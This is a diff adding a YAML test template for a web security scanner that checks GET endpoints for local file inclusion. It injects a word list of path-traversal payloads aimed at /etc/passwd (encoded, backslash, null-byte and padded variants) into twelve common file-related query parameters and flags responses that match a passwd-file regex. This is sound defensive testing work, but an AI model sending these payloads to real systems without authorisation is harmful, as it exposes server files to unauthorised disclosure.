@@ -1,0 +1,95 @@
+id: FILE_INCLUSION_NEW_PARAM
+info:
+  name: "LFI by adding new parameter"
+  description: "This test evaluates the vulnerability of a web application to Local File Inclusion by introducing new parameters for potential file path manipulation" 
+  details: >
+            "Assesses the vulnerability of a web application to Local File Inclusion by introducing additional parameters for potential file path manipulation."
+            "This test aims to identify any weaknesses that may allow an attacker to access sensitive files, leading to unauthorized data disclosure, server compromise, and potential execution of malicious code. It helps ensure the application's security and protect against LFI attacks"
+  impact: "Successful exploitation allows an attacker to read arbitrary files on a web server, potentially leading to unauthorized access, information disclosure, server compromise, and execution of malicious code."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: FILE_INCLUSION_NEW_PARAM
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+
+  method:
+    contains_either:
+      - "GET"
+
+wordLists:
+  filePaths: 
+    - /etc/passwd
+    - /etc/npasswd
+    - ..//etc/passwd
+    - ../..//etc/passwd
+    - ../../..//etc/passwd
+    - ../../../..//etc/passwd
+    - ../../../../..//etc/passwd
+    - ../../../../../..//etc/passwd
+    - ..%2f/etc/passwd
+    - ..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f..%2f/etc/passwd
+    - ..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
+    - ..\/etc/passwd
+    - ..\..\/etc/passwd
+    - ..\..\..\/etc/passwd
+    - ..\..\..\..\/etc/passwd
+    - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd
+    - 0x2e0x2e//etc/passwd
+    - 0x2e0x2e/0x2e0x2e//etc/passwd
+    - ..0x2f/etc/passwd
+    - ..0x2f..0x2f/etc/passwd
+    - ..0x2f..0x2f..0x2f/etc/passwd
+    - ..///etc/passwd
+    - ..//..///etc/passwd
+    - ..//..//..///etc/passwd
+    - .\\..\\/etc/passwd
+    - .\\..\\.\\..\\/etc/passwd
+    - ../../../../../../../../../../../../etc/passwd%00
+
+execute:
+  type: single
+  requests:
+    - req:
+      - add_query_param:
+          file: ${filePaths}
+      - add_query_param:
+          files: ${filePaths}
+      - add_query_param:
+          filePath: ${filePaths}
+      - add_query_param:
+          file_path: ${filePaths}
+      - add_query_param:
+          previewFilePath: ${filePaths}
+      - add_query_param:
+          controller: ${filePaths}
+      - add_query_param:
+          filename: ${filePaths}
+      - add_query_param:
+          page: ${filePaths}
+      - add_query_param:
+          sub_page: ${filePaths}
+      - add_query_param:
+          href: ${filePaths}
+      - add_query_param:
+          fn: ${filePaths}
+      - add_query_param:
+          module: ${filePaths}
+
+validate:
+  response_payload:
+    regex: "root:.*:0:0:"
